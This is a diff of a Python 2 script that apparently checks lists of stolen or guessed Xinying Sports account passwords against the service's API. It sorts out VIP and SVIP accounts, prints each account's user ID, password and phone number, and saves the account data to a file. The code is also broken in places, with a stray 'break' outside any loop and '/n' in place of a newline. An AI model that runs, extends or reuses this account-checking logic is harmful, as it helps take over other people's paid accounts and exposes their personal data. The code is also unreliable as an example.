@@ -9,7 +9,6 @@ import threadpool as tp
 import sys
 import datetime
 import time
-from pyquery import PyQuery as pq
 
 # 新英体育账户密码
 datas = []
@@ -21,6 +20,8 @@ def test(arg_):
 	# json_data = json.loads(r.content)
 	json_data = json.loads(r.content[41:-1])
 	data = json_data['data']
+	if data == 'null':
+		break
 	if data['level']== None:
 		pass
 	if data['level']:
@@ -33,9 +34,11 @@ def test(arg_):
 
 		elif vip == 'SVIP':
 			membership = data['membership']
-			if membership != {}:
-				if membership['diamond'] ==   '2018-05-31':
-					print membership,userId,passwd,data['tel']
+			# if membership != {}:
+			# 	if membership['diamond'] ==   '2018-05-31':
+			f = open('ssvip.txt','a+')
+			f.write(str(data)+"/n")
+			print membership,userId,passwd,data['tel']
 	# else :
 	# 	diamond = membership['diamond']
 	# 	if diamond != '2017-09-30' and  diamond != '':
